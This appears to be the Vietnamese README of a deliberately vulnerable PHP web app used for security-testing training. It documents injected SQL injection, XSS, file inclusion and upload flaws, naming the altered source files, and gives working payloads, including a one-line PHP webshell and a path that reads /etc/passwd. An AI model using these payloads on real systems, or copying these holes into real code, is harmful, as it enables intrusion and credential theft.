# LazyWeb — Vulnerable Web Application

Ứng dụng web chứa các lỗ hổng bảo mật cố tình, được tùy chỉnh từ [source gốc](https://github.com/RamadhanAmizudin/lazyweb) phục vụ cho project kiểm thử bảo mật tích hợp AI.

**Triển khai:**

```bash
docker-compose build
docker-compose up -d
```

Truy cập: `http://localhost` · Tạo tài khoản mới tại trang Register để sử dụng.

---

## 1. SQL Injection (SQLi)

|                         | Chi tiết                             |
| ----------------------- | ------------------------------------ |
| **Độ khó**              | ⭐ Dễ                                |
| **Thay đổi so với gốc** | Không — source gốc đã có sẵn lỗ hổng |

### Vị trí xuất hiện

| Tính năng      | File               | Tham số                 | Mô tả                                                              |
| -------------- | ------------------ | ----------------------- | ------------------------------------------------------------------ |
| Login          | `user/login.php`   | `email`                 | Nối chuỗi trực tiếp qua `sprintf()`, không dùng prepared statement |
| Update Profile | `user/profile.php` | `username`, `useremail` | Nối chuỗi trực tiếp trong câu `UPDATE`                             |

### Payload mẫu

**Tại form Login** — nhập vào ô Email:

```
' OR 1=1 -- -
```

→ Response thay đổi từ `"User Email doesn't exists"` → `"Invalid Password"` (chứng tỏ SQLi đã bypass được điều kiện WHERE).

**Kết hợp debug mode** — thêm `?debug=1` vào URL:

```
POST /user/login.php?debug=1

email=' UNION SELECT 1,2,3,4 -- -&password=abc
```

→ Server in ra toàn bộ dữ liệu truy vấn (bao gồm password hash) trực tiếp trên response.

---

## 2. Cross-Site Scripting (XSS)

|                         | Chi tiết                                                                                                |
| ----------------------- | ------------------------------------------------------------------------------------------------------- |
| **Độ khó**              | ⭐ Dễ → Trung bình                                                                                      |
| **Thay đổi so với gốc** | **Có** — thêm trang `search.php` mới + dùng cờ `nofilter` trong Smarty template để tắt auto-escape HTML |

### Vị trí xuất hiện

| Tính năng       | File               | Loại XSS      | Tham số              | Mô tả                                                                          |
| --------------- | ------------------ | ------------- | -------------------- | ------------------------------------------------------------------------------ |
| Search          | `search.php`       | **Reflected** | `q` (GET)            | Giá trị tham số `q` được hiển thị trực tiếp trên trang kết quả mà không escape |
| Profile Welcome | `user/profile.php` | **Reflected** | `msg` (GET)          | Tham số `msg` hiển thị lời chào mà không escape                                |
| Inbox           | `user/inbox.php`   | **Stored**    | `subject`, `message` | Nội dung tin nhắn lưu vào DB và hiển thị không escape khi đọc                  |

### Payload mẫu

**Reflected XSS trên Search** (không cần đăng nhập):

```
http://localhost/search.php?q=<script>alert('XSS')</script>
```

→ Hộp thoại `alert` xuất hiện ngay trên trình duyệt.

**Reflected XSS trên Profile:**

```
http://localhost/user/profile.php?msg=<script>alert('XSS')</script>
```

**Stored XSS qua Inbox:**

- Đăng nhập → Inbox → Gửi tin nhắn với Subject: `<script>alert('Stored')</script>`
- Khi nạn nhân mở Inbox → JS sẽ tự động thực thi.

---

## 3. Local File Inclusion (LFI)

|                         | Chi tiết                                                                                           |
| ----------------------- | -------------------------------------------------------------------------------------------------- |
| **Độ khó**              | ⭐ Dễ                                                                                              |
| **Thay đổi so với gốc** | **Có** — bỏ đuôi `.php` tự động nối vào cuối. Gốc: `include $page . '.php'` → Sửa: `include $page` |

### Vị trí xuất hiện

| Tính năng   | File       | Tham số      | Mô tả                                                                                     |
| ----------- | ---------- | ------------ | ----------------------------------------------------------------------------------------- |
| Page Router | `page.php` | `page` (GET) | Dùng `include` trực tiếp giá trị từ người dùng, không có whitelist hay kiểm tra đường dẫn |

### Payload mẫu

**Đọc file hệ thống:**

```
http://localhost/page.php?page=../../../etc/passwd
```

→ Nội dung file `/etc/passwd` hiển thị trực tiếp trong response body.

**Đọc source code ứng dụng:**

```
http://localhost/page.php?page=config.php
```

→ Leak thông tin cấu hình database (host, username, password).

---

## 4. Insecure File Upload

|                         | Chi tiết                                                                                                               |
| ----------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| **Độ khó**              | ⭐⭐ Trung bình                                                                                                        |
| **Thay đổi so với gốc** | **Có** — giữ nguyên tên file gốc thay vì đổi thành `{user_id}.png` + chỉ kiểm tra MIME type (dễ bypass qua Burp Suite) |

### Vị trí xuất hiện

| Tính năng     | File               | Tham số         | Mô tả                                                                                                                                            |
| ------------- | ------------------ | --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Upload Avatar | `user/profile.php` | `avatar` (FILE) | Kiểm tra `Content-Type` header — chỉ cho phép `image/jpeg`, `image/png`, `image/gif`. Tuy nhiên header này do client gửi lên nên dễ dàng giả mạo |

### Payload mẫu

**Bước 1:** Tạo file webshell `shell.php`:

```php
<?php system($_GET['cmd']); ?>
```

**Bước 2:** Upload file `shell.php` tại trang Profile (chọn làm avatar).

**Bước 3:** Dùng Burp Suite Intercept request, sửa header:

```
Content-Type: application/x-php  →  Content-Type: image/png
```

**Bước 4:** Truy cập webshell:

```
http://localhost/user/avatar/shell.php?cmd=id
```

→ Server trả về kết quả lệnh `id` (ví dụ: `uid=33(www-data)`).

---

## Tổng hợp thay đổi so với source gốc

| File                       | Thay đổi                                                            |
| -------------------------- | ------------------------------------------------------------------- |
| `search.php`               | **Thêm mới** — trang tìm kiếm có Reflected XSS                      |
| `templates/search.php`     | **Thêm mới** — template hiển thị kết quả tìm kiếm (dùng `nofilter`) |
| `page.php`                 | Bỏ suffix `.php` trong `include` → cho phép LFI trực tiếp           |
| `templates/index.php`      | Cập nhật link nội bộ thêm `.php` (do thay đổi `page.php`)           |
| `user/profile.php`         | Giữ tên file gốc + chỉ check MIME type → File Upload vulnerability  |
| `templates/user/login.php` | Sửa lỗi form lồng form (bug gốc)                                    |
| `templates/base.php`       | Cập nhật giao diện                                                  |
| `Dockerfile`               | Fix lỗi apt source hết hạn (Debian EOL)                             |
| `docker-compose.yml`       | Đổi port MySQL host từ 3306 sang 3307                               |
